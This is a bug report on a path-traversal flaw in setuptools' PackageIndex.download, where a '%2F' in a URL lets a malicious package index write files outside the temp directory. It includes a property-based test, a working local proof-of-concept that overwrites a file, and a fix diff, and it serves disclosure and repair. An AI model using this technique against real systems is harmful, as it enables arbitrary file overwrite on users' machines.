# Bug Report: setuptools.package_index PackageIndex.download writes outside tmpdir via percent-encoded slashes

**Target**: `setuptools.package_index.PackageIndex.download` / `PackageIndex._resolve_download_filename`
**Severity**: High
**Bug Type**: Logic
**Date**: 2026-10-28

## Summary

`PackageIndex.download(url, tmpdir)` says a URL "is downloaded to a subpath of `tmpdir`". But the filename comes from the URL-unquoted last path segment. When that segment contains `%2F`, it becomes an absolute path, and `os.path.join(tmpdir, name)` throws `tmpdir` away. The server's response can then be written to any path on disk the process can write to.

## Property-Based Test

```python
segment = st.lists(
    st.sampled_from(["a", "b", ".", "..", "%2F", "%2f", "%5C", "/", "\\", "-", "x.tar.gz"]),
    min_size=1, max_size=6,
).map("".join)

@settings(max_examples=1000)
@given(prefix=st.lists(st.sampled_from(["p", "q"]), max_size=3), last=segment)
def test_download_target_inside_tmpdir(prefix, last):
    """CLAIM-1: download destination is a subpath of tmpdir."""
    url = "https://example.com/" + "/".join(prefix + [last])
    dest = PackageIndex._resolve_download_filename(url, TMPDIR)
    root = os.path.realpath(TMPDIR)
    real = os.path.realpath(dest)
    assert os.path.commonpath([root, real]) == root, (url, dest)
```

**Failing input**: `prefix=[], last='%2F'` → `_resolve_download_filename('https://example.com/%2F', '/tmp/pkgindex_dl') == '/'`

## Reproducing the Bug

```python
import http.server, os, tempfile, threading, urllib.parse
from setuptools.package_index import PackageIndex

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers()
        self.wfile.write(b"pwned")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

tmpdir = tempfile.mkdtemp()
victim = os.path.join(tempfile.mkdtemp(), "victim.tar.gz")
url = f"http://127.0.0.1:{srv.server_port}/pkg/{urllib.parse.quote(victim, safe='')}"
result = PackageIndex().download(url, tmpdir)
assert open(victim).read() == "pwned"
assert not result.startswith(tmpdir)
```

## Why This Is A Bug

The `download` docstring promises: "If `spec` is a URL, it is downloaded to a subpath of `tmpdir`". The `while '..' in name` loop in `_resolve_download_filename` shows the author meant to stop path escapes, but it misses absolute paths. Download URLs come from package index and find-links pages, which can be remote and untrusted (`process_url` → `scan_url` → `fetch_distribution` → `download`). So a malicious index can overwrite arbitrary files, for example `~/.bashrc` or files in site-packages. This matches CVE-2025-47273.

## Fix

```diff
     @staticmethod
     def _resolve_download_filename(url, tmpdir):
         name, _fragment = egg_info_for_url(url)
         if name:
             while '..' in name:
                 name = name.replace('..', '.').replace('\\', '_')
         else:
             name = "__downloaded__"  # default if URL has no path contents
 
         if name.endswith('.egg.zip'):
             name = name[:-4]  # strip the extra .zip before download
 
-        return os.path.join(tmpdir, name)
+        filename = os.path.join(tmpdir, name)
+
+        # ensure path resolves within the tmpdir
+        if not filename.startswith(str(tmpdir)):
+            raise ValueError(f"Invalid filename {filename}")
+
+        return filename
```
